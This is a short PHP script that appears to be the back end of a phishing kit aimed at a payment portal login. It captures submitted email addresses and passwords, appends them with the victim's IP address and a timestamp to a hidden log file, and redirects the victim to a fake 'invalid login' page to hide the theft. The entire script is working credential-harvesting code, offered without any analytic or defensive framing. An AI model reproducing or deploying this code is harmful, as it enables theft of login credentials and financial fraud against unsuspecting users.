<?php
$file = "__memefhgdkudasi_.txt";
$Email = $_POST['Email'];
$Password = $_POST['Password'];
$ip = $_SERVER['REMOTE_ADDR'];
$today = date("F j, Y, g:i a");

$handle = fopen($file, 'a');
fwrite($handle, "\n");
fwrite($handle, "Email   	: ");
fwrite($handle, "$Email");
fwrite($handle, "\n");
fwrite($handle, "Password   	: ");
fwrite($handle, "$Password");
fwrite($handle, "\n");
fwrite($handle, "IP Address	: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fwrite($handle, "Time		: ");
fwrite($handle, "$today");
fwrite($handle, "\n");
fwrite($handle, "https://portal.lyopay.com/login ");
fwrite($handle, "\n");
fclose($handle);

echo "<script LANGUAGE=\"JavaScript\">
<!--
top.location=\"/invalid.html?login\";
// -->
</script>";
?>